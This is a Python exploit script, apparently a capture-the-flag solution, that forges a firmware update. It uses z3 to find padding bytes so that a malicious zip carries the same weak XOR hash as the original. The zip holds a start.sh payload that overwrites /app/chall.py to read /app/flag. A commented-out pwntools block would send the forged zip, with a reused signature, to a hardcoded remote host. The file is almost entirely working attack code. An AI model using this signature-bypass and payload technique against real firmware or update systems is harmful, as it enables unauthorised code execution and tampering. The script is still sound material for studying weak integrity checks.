import base64
import zipfile
from z3 import *
from pwn import *


def hash_file(fileContent: bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i + j] << 8 * j for j in range(8) if i + j < len(fileContent)])
    return hash


def solve_xor(target):
    a, b, c, d, e, f, g, h = [Int(chr(i)) for i in range(97, 105)]
    s = Solver()
    s.add(*[(var >= 0) & (var <= 255) for var in [a, b, c, d, e, f, g, h]])
    s.add((a * 2 ** (8 * 0)) + (b * 2 ** (8 * 1)) + (c * 2 ** (8 * 2)) + (d * 2 ** (8 * 3)) + (e * 2 ** (8 * 4)) +
          (f * 2 ** (8 * 5)) + (g * 2 ** (8 * 6)) + (h * 2 ** (8 * 7)) == target)

    if s.check() == sat:
        model = s.model()
        found = [model[var].as_long() for var in [a, b, c, d, e, f, g, h]]
        return found
    return []


def main():
    ip = '152.96.15.7'
    port = 1337
    payload = "echo \"print(open('/app/flag').read())\" > /app/chall.py"
    payloadname = 'start.sh'
    zipname = 'firmware.zip'

    # Hash current
    oldfile = open(zipname, 'rb').read()
    old = hash_file(oldfile)
    print(f"[+] Old hash: {old}")

    # Create zip with exploit (padding)
    open(payloadname, 'w').write(payload)
    zipfile.ZipFile(f"new-{zipname}", 'w').write(payloadname, arcname=payloadname)
    middle = hash_file(open(f"new-{zipname}", 'rb').read())
    print(f"[+] Middle hash: {middle}")

    # Search for XOR solution
    print(f"[+] Required XOR: {old ^ middle}")
    found = solve_xor(old ^ middle)
    if found:
        print(f"[+] Success!")
        open(f"new-{zipname}", 'ab').write(b''.join(i.to_bytes() for i in found))
        new = open(f"new-{zipname}", 'rb').read()
        newhash = hash_file(new)
        print(f"[+] New hash: {newhash}")
        if newhash == old:
            b64_new = base64.b64encode(new)
            print(f"[+] b64 zip payload: {b64_new}")
            print(f"[+] Update Firmware")
            '''r = remote(ip, port)
            r.sendlineafter(b"$", b"version")
            r.recvuntil(b"Signature: ")
            pkcs15 = r.recvuntil(b"\n\n")
            r.sendlineafter(b"$", b"update")
            r.sendlineafter(b">", b64_new)
            r.sendlineafter(b">", pkcs15)
            r.recv()
            r.close()
            print(f"[+] Collect flag")
            r = remote(ip, port)
            print(f"{r.recvall()}")'''
    else:
        print("something went wrong")


if __name__ == "__main__":
    main()